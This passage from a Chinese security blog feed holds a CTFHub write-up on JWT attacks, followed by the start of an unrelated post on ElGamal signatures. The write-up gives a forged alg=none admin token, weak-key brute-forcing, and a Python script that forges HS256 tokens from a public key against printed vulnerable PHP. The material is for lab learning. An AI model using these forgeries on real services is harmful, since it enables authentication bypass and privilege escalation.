class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用&quot;点&quot;（.）分隔，就可以返回给用户。</p><p>参考链接</p><p><a href="https://jwt.io/introduction/">官网解释</a></p><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html"> 阮一峰老师亲作</a>(力推，写的很清晰)</p><p><a href="https://en.wikipedia.org/wiki/JSON_Web_Token">JSON Web Token - Wikipedia</a></p><blockquote><p>最后一个链接时维基百科，需要翻墙</p></blockquote><h5 id="2-敏感信息泄露">2.敏感信息泄露</h5><blockquote><p>JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}</p></blockquote><p>题目写的很清楚，就是获取token，flag藏在token里面，这里给官方的解码网站<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p>随便用个用户名和密码登录</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/3.png" alt=""></p><p>然后用burp抓包，或者f12查看cookie，就能看到token</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/4.png" alt=""></p><p>放到网站进行解码，把flag拼接好就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/5.png" alt=""></p><h5 id="3-无签名">3.无签名</h5><blockquote><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p></blockquote><p>其实步骤和上面一样就是多了修改加密算法为none和修改role为admin（题目以及登录后给的提示）</p><p>先去抓包</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/6.png" alt=""></p><p>把token解码</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/8.png" alt=""></p><p>遗憾的是这个网站不支持none</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/9.png" alt=""></p><p>把header部分和payload部分进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=</span><br><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ==</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/7.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/10.png" alt=""></p><p>然后拼接一下</p><blockquote><p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 <a href="http://api.example.com/?token=xxx%EF%BC%89%E3%80%82Base64">api.example.com/?token=xxx）。Base64</a> 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。</p></blockquote><p>=号被省略（小数点记得不能丢）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.</span><br></pre></td></tr></table></figure><p>用burp发送就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/14.png" alt=""></p><p>彩蛋：</p><p>不知道怎么触发的。。。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/13.png" alt=""></p><h5 id="4-弱密钥">4.弱密钥</h5><blockquote><p>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag</p></blockquote><p>老样子登录+抓包发现加密算法是HS256</p><blockquote><p><strong>HS256 使用同一个「secret_key」进行签名与验证（对称加密</strong>）。</p></blockquote><p>根据题目爆破密钥</p><p>这里需要用到c-jwt-cracker（上面工具有安装方法）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/13.png" alt=""></p><p>直接暴力跑就是了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/16.png" alt=""></p><p>把获取到的密钥输入+更换role（这里我忘记截图了，上网找的）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/23.png" alt=""></p><p>用burp发送就能获取flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/18.png" alt=""></p><p>又是彩蛋。。。（不明白怎么触发的）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/17.png" alt=""></p><h5 id="5-修改签名算法">5.修改签名算法</h5><blockquote><p>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。</p></blockquote><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">        &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span> /&gt;</span><br><span class="line">        &lt;title&gt;CTFHub JWTDemo&lt;/title&gt;</span><br><span class="line">        &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/static/style.css&quot;</span> /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;main id=<span class="string">&quot;content&quot;</span>&gt;</span><br><span class="line">            &lt;header&gt;Web Login&lt;/header&gt;</span><br><span class="line">            &lt;form id=<span class="string">&quot;login-form&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span> /&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> /&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;Login&quot;</span> /&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;a href=<span class="string">&quot;/publickey.pem&quot;</span>&gt;publickey.pem&lt;/a&gt;</span><br><span class="line">        &lt;/main&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];<span class="meta">?&gt;</span></span><br><span class="line">        &lt;hr/&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWTHelper</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$payload</span>=<span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$key</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$alg</span>=<span class="string">&#x27;HS256&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> JWT::<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>, <span class="variable">$key</span>, <span class="variable">$alg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$token</span>, <span class="variable">$key</span>, <span class="variable">$alg</span>=<span class="string">&#x27;HS256&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">getHeader</span>(<span class="variable">$token</span>);</span><br><span class="line">            <span class="variable">$algs</span> = <span class="title function_ invoke__">array_merge</span>(<span class="keyword">array</span>(<span class="variable">$header</span>-&gt;alg, <span class="variable">$alg</span>));</span><br><span class="line">      <span class="keyword">return</span> JWT::<span class="title function_ invoke__">decode</span>(<span class="variable">$token</span>, <span class="variable">$key</span>, <span class="variable">$algs</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getHeader</span>(<span class="params"><span class="variable">$jwt</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$tks</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$jwt</span>);</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$headb64</span>, <span class="variable">$bodyb64</span>, <span class="variable">$cryptob64</span>) = <span class="variable">$tks</span>;</span><br><span class="line">        <span class="variable">$header</span> = JWT::<span class="title function_ invoke__">jsonDecode</span>(JWT::<span class="title function_ invoke__">urlsafeB64Decode</span>(<span class="variable">$headb64</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$header</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line"><span class="variable">$PRIVATE_KEY</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/privatekey.pem&quot;</span>);</span><br><span class="line"><span class="variable">$PUBLIC_KEY</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;./publickey.pem&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$FLAG</span>)&#123;</span><br><span class="line">            <span class="variable">$jwt_payload</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;role&#x27;</span>=&gt; <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            );</span><br><span class="line">            <span class="variable">$token</span> = <span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">encode</span>(<span class="variable">$jwt_payload</span>, <span class="variable">$PRIVATE_KEY</span>, <span class="string">&#x27;RS256&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$jwt_payload</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;role&#x27;</span>=&gt; <span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line">            );</span><br><span class="line">            <span class="variable">$token</span> = <span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">encode</span>(<span class="variable">$jwt_payload</span>, <span class="variable">$PRIVATE_KEY</span>, <span class="string">&#x27;RS256&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;token&quot;</span>, <span class="variable">$token</span>, <span class="title function_ invoke__">time</span>()+<span class="number">1800</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; <span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>], <span class="variable">$PUBLIC_KEY</span>) != <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>], <span class="variable">$PUBLIC_KEY</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;role === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3QKnxxeQJtZyw4QOC74k</span><br><span class="line">b9sVGhCzzDUHUXIHD5yCH5e1Fyx2SJFBrpLTs58kMHGqE8CGMn3jMfGO+tNEdFyn</span><br><span class="line">8HrItDsh7aVMWI61EEJ+ZpDrkfP8Ep98a07t/cBUxBxY5MdmQl/AfAlnh5qnfTQk</span><br><span class="line">/A3RaUbuPTMHDqRI3PhEe7X+JDvL4q+4i2weaQA/Umnc2OEJ7t4q+aLeezRBvMaN</span><br><span class="line">pL1RMB4SuyWrPVTvSEh8d1D5eDAP579r5mCj5s8jbtmE42nf1eKBnGKaW6+rUWws</span><br><span class="line">/qBxrXMysCEllgMujDGsBekko+IJc/upgP9MHebaL6nLYjdsowTbJ1N5N/6OkfLD</span><br><span class="line">nwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/19.png" alt=""></p><p>登录抓包获取token</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/21.png" alt=""></p><p>然后代码审计看源码</p><p>如果我们想要获得flag，我们发送的 token 不为空 并且发送的 cookie 为PUBLIC_KEY 也就是公码<br>并且 role 为 admin。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; <span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>], <span class="variable">$PUBLIC_KEY</span>) != <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>], <span class="variable">$PUBLIC_KEY</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;role === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时我们看上面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$payload</span>=<span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$key</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$alg</span>=<span class="string">&#x27;HS256&#x27;</span></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> JWT::<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>, <span class="variable">$key</span>, <span class="variable">$alg</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$token</span>, <span class="variable">$key</span>, <span class="variable">$alg</span>=<span class="string">&#x27;HS256&#x27;</span></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="variable">$header</span> = <span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">getHeader</span>(<span class="variable">$token</span>);</span><br><span class="line">           <span class="variable">$algs</span> = <span class="title function_ invoke__">array_merge</span>(<span class="keyword">array</span>(<span class="variable">$header</span>-&gt;alg, <span class="variable">$alg</span>));</span><br><span class="line">     <span class="keyword">return</span> JWT::<span class="title function_ invoke__">decode</span>(<span class="variable">$token</span>, <span class="variable">$key</span>, <span class="variable">$algs</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>发现在 JWTHelper类中，decode()、encode()默认的加密解密方式都为“HS256”<br>在回想这样一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">JWTHelper</span>::<span class="title function_ invoke__">decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>], <span class="variable">$PUBLIC_KEY</span>) != <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>我们就明白了：<br>在JWTHelper类的decode()中，如果输入公匙正确，并且后面的if语句正确，那么就会就会显示flag。同时 公匙要<code>HS256</code>加密。<br>所以我们要对公匙进行<code>HS256</code>加密，加入到token后面<br>在这里，我们可以自己编写脚本进行加密(记得自己保存号自己的publickey.pem文件)，脚本需要读取公钥文件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;publickey.pem&#x27;</span>)    <span class="comment">#需要将文中的publickey下载与脚本同目录</span></span><br><span class="line">key = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Paste your header and payload here</span></span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating encoded header</span></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">&quot;utf-8&quot;</span>))<span class="comment">#对字节串进行Base64编码。encode(&quot;utf-8&quot;)是将这个字符串从UTF-8格式转换为字节串（bytes）</span></span><br><span class="line">encodeHeader = <span class="built_in">str</span>(encodeHBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>) <span class="comment"># .rstrip(&quot;=&quot;) .去除Base64编码后可能出现的尾随等号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating encoded payload</span></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodePayload = <span class="built_in">str</span>(encodePBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Concatenating header and payload</span></span><br><span class="line">token = (encodeHeader + <span class="string">&quot;.&quot;</span> + encodePayload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating signature</span></span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(<span class="built_in">bytes</span>(key, <span class="string">&quot;UTF-8&quot;</span>), token.encode(<span class="string">&quot;utf-8&quot;</span>), hashlib.sha256).digest()).decode(<span class="string">&quot;UTF-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token + <span class="string">&quot;.&quot;</span> + sig)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/24.png" alt=""></p><p>用burp发送即可获得flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/22.png" alt=""></p><h2 id="2-Pwn">2.Pwn</h2><h2 id="3-Reverse">3.Reverse</h2><h2 id="4-Crypto">4.Crypto</h2><h2 id="5-Misc">5.Misc</h2><h2 id="6-彩蛋">6.彩蛋</h2><h2 id="7-BlockChain">7.BlockChain</h2>]]></content>
    
    
    <summary type="html">CTFHub技能树+详细Write up</summary>
    
    
    
    <category term="CTF" scheme="https://nonevector.top/categories/CTF/"/>
    
    
    <category term="CTFHub" scheme="https://nonevector.top/tags/CTFHub/"/>
    
  </entry>
  
  <entry>
    <title>数字签名之ElGamal签名体制</title>
    <link href="https://nonevector.top/posts/14.html"/>
    <id>https://nonevector.top/posts/14.html</id>
    <published>2023-11-19T02:47:06.064Z</published>
    <updated>2023-11-29T04:52:45.683Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数字签名原理">数字签名原理</h2><p>一个完整的数字签名方案由三部分组成:密钥生成算法、签名算法和验证算法。密钥生成算法是根据系统参数为签名者生成公钥和私钥;签名算法是产生数字签名的某种算法,而验证算法是检验一个数字签名是否有效(即是否由指定实体生成)的某种算法。如无特殊说明,下文继续用 A 代表签名者,B 代表验证者。</p><p>下面给出数字签名的形式化定义:</p><p>(1)密钥生成算法</p><p>系统初始化产生签名方案的基本参数(M,S,K,Sign,Ver),其中 M 为消息空间,S 为签名空间，K 为密钥空间，包含私钥和公钥,Sign 为签名算法集合,Ver 为签名验证算法集合。用户 A 执行密钥生成算法生成自己的公私密钥$(k_1,k_2)$。</p><p>(2)签名算法</p><p>对任意的消息 $m \in M$,有$s=sign_{k_2}(m)$,且$s \in S$,那么 s 为消息的签名,将签名消息组(m,s)发送给签名验证者。</p><p>(3)验证算法</p><p>对于上述的$k_1 \in K$,有相应的签名验证算法:$ver_{k_1}:M \times S \rightarrow \lbrace True,False \rbrace,ver_{k_1} \in Ver$,且</p><p>$$<br>ver_{k1}(m, s) =<br>\begin{cases}<br>True  &amp; 当 s = sign_{k_2} \newline<br>False &amp; 当s \neq sign_{k_2}<br>\end{cases}<br>$$</p><p>签名验证者收到(m,s)后,计算 $ver_{k_1}(m,s)$,若 $ver_{k_1}(m,s)=True$,则签名有效;否则签名无效。</p><p>对于每一个$k \in K$,签名函数$ sign*{k_2}$,和签名验证函数 $ver*{k<em>1}$, 是容易计算的。而验证函数 $ver</em>{k<em>1}$是公开的,同时还要求对任意的消息 m,在未知$k_2$条件下从集合 S 中选取 s 使得 $ver</em>{k_1}(m,s)=True$ 是非常困难的,也就是说,攻击者对消息 m 产生有效的签名 s 是不可能的。</p><p>根据定义,在进行私钥签名前,先进行消息关键信息提取。</p><p>如图 8-1 所示,发送方 A 将消息用 Hash 算法产生一个消息摘要(Message Digest),这个消息摘要有两个重要特性:<strong>抗碰撞性</strong>和<strong>摘要长度</strong>固定,使得任何消息产生的签名值长度是一样的。发送方 A 